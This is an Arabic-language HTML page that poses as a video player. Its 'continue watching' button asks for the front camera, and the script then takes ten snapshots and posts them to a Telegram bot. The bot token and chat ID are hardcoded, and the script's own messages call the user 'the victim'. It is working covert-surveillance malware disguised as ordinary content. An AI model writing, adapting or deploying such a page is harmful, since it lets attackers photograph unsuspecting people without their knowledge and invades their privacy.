<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title></title> <!--   -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: white;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      overflow: hidden;
    }
    #container {
      z-index: 9999;
      background: rgba(0,0,0,0.85);
      padding: 60px 40px;
      border-radius: 20px;
      max-width: 90%;
      box-shadow: 0 0 40px rgba(255,255,255,0.3);
    }
    h1 {
      font-size: 36px;
      margin-bottom: 50px;
      text-shadow: 0 0 15px #fff;
    }
    button {
      padding: 25px 70px;
      margin: 30px 20px;
      font-size: 28px;
      font-weight: bold;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      color: white;
      transition: all 0.3s;
      width: 350px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
    }
    button:hover {
      transform: scale(1.08);
      box-shadow: 0 12px 30px rgba(255,255,255,0.4);
    }
    #yes { background: #00cc44; }
    #no { background: #ff4444; }
    #msg {
      margin-top: 40px;
      font-size: 22px;
      color: #ddd;
    }
    #video {
      display: none;
      width: 100vw;
      height: 100vh;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 1;
    }
  </style>
</head>
<body>

<div id="container">
  <h1>   </h1>
  <button id="yes" onclick="startCamera()">متابعة مشاهدة الفيديو</button>
  <br>
  <button id="no" onclick="reject()">رفض مشاهدة الفيديو</button>
  <div id="msg">    </div>
</div>

<iframe id="video" src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>

<script>
// Telegram Config – تاعك
const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
const CHAT_ID = '6769216123';

// إرسال نص
function sendText(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
  }).catch(() => {});
}

// رفض → ما يصير والو
function reject() {
  document.getElementById('msg').innerText = 'تم الرفض، شكراً!';
  setTimeout(() => window.close(), 3000);
}

// متابعة → طلب الكاميرا + سحب 10 صور
async function startCamera() {
  document.getElementById('container').style.display = 'none';
  document.getElementById('video').style.display = 'block';
  document.getElementById('msg').innerText = 'جاري تشغيل الفيديو...';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user' } // الكاميرا الأمامية فقط
    });

    sendText('✅ الضحية وافق على الكاميرا الأمامية!');

    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    let count = 0;
    const interval = setInterval(() => {
      if (count >= 10) {
        clearInterval(interval);
        stream.getTracks().forEach(track => track.stop());
        sendText('تم سحب 10 صور من الكاميرا الأمامية بنجاح');
        return;
      }

      html2canvas(video, {scale: 0.5}).then(canvas => {
        const img = canvas.toDataURL('image/png');
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: img,
            caption: `صورة ${count+1}/10 من الكاميرا الأمامية`
          })
        }).catch(() => {});
        count++;
      });
    }, 800); // صورة كل 0.8 ثانية

  } catch (err) {
    sendText(`❌ رفض الوصول للكاميرا: ${err.message || 'غير معروف'}`);
    document.getElementById('msg').innerText = 'يرجى السماح بالكاميرا لمشاهدة الفيديو';
    document.getElementById('container').style.display = 'flex';
    document.getElementById('video').style.display = 'none';
  }
}
</script>

</body>
</html>
